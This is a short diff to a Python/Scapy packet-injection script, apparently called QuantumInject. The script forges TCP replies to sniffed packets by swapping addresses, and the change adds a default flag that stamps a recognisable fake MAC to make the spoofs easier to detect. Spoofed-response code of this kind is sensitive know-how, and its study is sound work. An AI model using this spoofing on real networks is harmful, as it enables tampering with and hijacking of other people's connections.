@@ -8,9 +8,8 @@ import re as Regex
 import getopt
 
 #Justification is: Functions in this script require sudo regardless of whether it is the main script or not.
-
 if OS.getuid() != 0:
-    print "This script will require root privileges. Attempting to elevate..."
+    print "QuantumInject will require root privileges. Attempting to elevate..."
     Process.call(["sudo"] + System.argv)
     exit(77)
 
@@ -19,6 +18,7 @@ from scapy.all import *
 interface = None
 spoofed_payload = None
 regex = None
+easy_mac_address = True # Global setting
 
 def handle(packet):
     if (
@@ -38,7 +38,11 @@ def handle(packet):
         del spoofed_packet[IP].chksum
         del spoofed_packet[TCP].chksum
 
-        spoofed_packet[Ether].src, spoofed_packet[Ether].dst = packet[Ether].dst, packet[Ether].src
+        if not easy_mac_address:
+            spoofed_packet[Ether].src, spoofed_packet[Ether].dst = packet[Ether].dst, packet[Ether].src
+        else: # make IP spoofs easier to detect
+            spoofed_packet[Ether].src, spoofed_packet[Ether].dst = 'be:ef:ca:fe:ba:be', packet[Ether].src
+
         spoofed_packet[IP].src, spoofed_packet[IP].dst = packet[IP].dst, packet[IP].src
         spoofed_packet[IP].flags = 'DF'
         spoofed_packet[TCP].sport, spoofed_packet[TCP].dport =  packet[TCP].dport, packet[TCP].sport
